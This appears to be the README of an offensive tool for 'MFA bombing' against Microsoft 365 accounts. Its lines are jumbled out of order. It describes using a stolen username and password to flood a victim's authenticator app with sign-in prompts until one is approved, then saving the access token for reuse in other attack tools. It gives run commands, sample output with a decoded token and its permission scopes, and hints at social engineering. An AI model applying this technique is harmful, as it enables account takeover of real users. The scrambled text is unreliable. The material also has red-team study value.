
        " ... [dedacted] ... "
        "mfa"
        "pwd",
    "acct": 0,
    "acr": "1",
    "aio": " ... [dedacted] ... ",
    "amr": [
    "app_displayname": "Microsoft Office",
    "appid": " ... [dedacted] ... ",
    "appidacr": "0",
    "aud": "https://graph.microsoft.com",
    "exp": 1701433450,
    "family_name": " ... [dedacted] ... ",
    "given_name": " ... [dedacted] ... ",
    "iat": 1701428346,
    "idtyp": "user",
    "ipaddr": " ... [dedacted] ... ",
    "iss": "https://sts.windows.net/90931373-6ad6-49cb-9d8c-22eebb6968fa/",
    "name": " ... [dedacted] ... ",
    "nbf": 1701428346,
    "oid": " ... [dedacted] ... ",
    "onprem_sid": " ... [dedacted] ... ",
    "platf": "3",
    "puid": " ... [dedacted] ... ",
    "rh": " ... [dedacted] ... ",
    "scp": "AuditLog.Read.All Calendar.ReadWrite Calendars.Read.Shared Calendars.ReadWrite Contacts.ReadWrite DataLossPreventionPolicy.Evaluate Directory.AccessAsUser.All Directory.Read.All Files.Read Files.Read.All Files.ReadWrite.All Group.Read.All Group.ReadWrite.All InformationProtectionPolicy.Read Mail.ReadWrite Notes.Create Organization.Read.All People.Read People.Read.All Printer.Read.All PrintJob.ReadWriteBasic SensitiveInfoType.Detect SensitiveInfoType.Read.All SensitivityLabel.Evaluate Tasks.ReadWrite TeamMember.ReadWrite.All TeamsTab.ReadWriteForChat User.Read.All User.ReadBasic.All User.ReadWrite Users.Read",
    "sub": " ... [dedacted] ... ",
    "tenant_region_scope": "EU",
    "tid": " ... [dedacted] ... ",
    "unique_name": " ... [dedacted] ... ",
    "upn": " ... [dedacted] ... ",
    "uti": " ... [dedacted] ... ",
    "ver": "1.0",
    "wids": [
    "xms_tcdt":  ... [dedacted] ... ,
    "xms_tdbr": "EU"
    ],
    ```
   ```bash
   pip install -r requirements.txt
# Credits & Acknowledgements
# License
# Microsoft 365 MFA Bombing Script
# Notes
## Applicability
## TODO
## Usage
### Installation
### Running the Script
### Sample output
- Number Matching
- Passwordless Sign-in
- Phone Sign-in
- Push Notification Approval
- Time-Based One-Time Password (TOTP)
1. Clone this repository.
2. Install the required dependencies by running:
As of May 2023 Microsoft mostly disarmed this fatigue bombing attacks by enforcing the number matching mechanism which require the user to manually enter a two digit number which is presented in the browser as part of the login flow. Generally speaking that breaks simple flooding attacks as only the victim is in possession of the matching number. However one could still retreive the information via real-time social engineering.
Base64 encoded JWT access_token:
Bei Ihrem Konto anmelden
Decoded JWT payload:
Enter your password: 
Exiting...
Heavily inspired by the awesome work of Steve Borosh ([@rvrsh3ll](https://github.com/rvrsh3ll)) and Beau Bullock ([@dafthack](https://github.com/dafthack)). Huge kudos to them for all the awesome research and tooling they release.
If you find environments that still rely on classic push notifications, this attack vector should still work fine. Also I leave it to your own creativity to find applicable scenarios ;-)
In case a username & password combination was compromised it can be used to flood the authenticator app with authentication requests.
It is intended to be used in Social Engineering / Red-Team / Pentesting scenarios when targeting O365/MS-Online users in Azure (now called Entra ID).
It keeps bombing the user with MFA requests and stores the access_token once the MFA was approved.
Microsoft used to offer different MFA authentication mechanisms within their authenticator app like:
Once the second factor has been approved the valid JWT access_token will be stored in decoded and encoded format locally. The token can be reused in other tools like [TokenTactics](https://github.com/f-bader/TokenTacticsV2), [GraphRunner](https://github.com/dafthack/GraphRunner) or manual requesting different endpoints in Azure...
Replace <username> with the target Microsoft 365 username. The password can be provided directly after the --password flag, or the script will prompt for it if not supplied.
Stored Base64 encoded access token as 'access_token_user@domain.com_20231201120406.txt'
Stored decoded access token as 'access_token_user@domain.com_20231201120406.json'
The --interval flag allows you to set the polling interval in seconds (default is 60 seconds).
The fireprox implementation is yet not finished and may or may not be implemented in the future...
This Python script automates the authentication process for Microsoft 365 by using the device code flow and Selenium for automated login.
This project is licensed under the [MIT License](https://chat.openai.com/c/LICENSE)
This script utilizes Selenium, which requires a compatible WebDriver (in this case, Chrome WebDriver... but you can change it towards something else if you need to).
To run the script, execute the following command:
To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code GKZAQ433Q to authenticate.
[*] Device code:
[*] Password: ********************************
[*] Storing token...
[*] Successful authentication. Access token expires at: 2023-12-01 12:24:10
[*] Username: user@domain.com
```
````
```bash
eyJ0 ... [dedacted] ... dsgHmA
https://login.microsoftonline.com/common/oauth2/deviceauth
m365-fatigue python3 m365-fatigue.py --user user@domain.com
python m365-fatigue.py --user <username> [--password <password>] [--interval <seconds> (default: 60)]
{
}
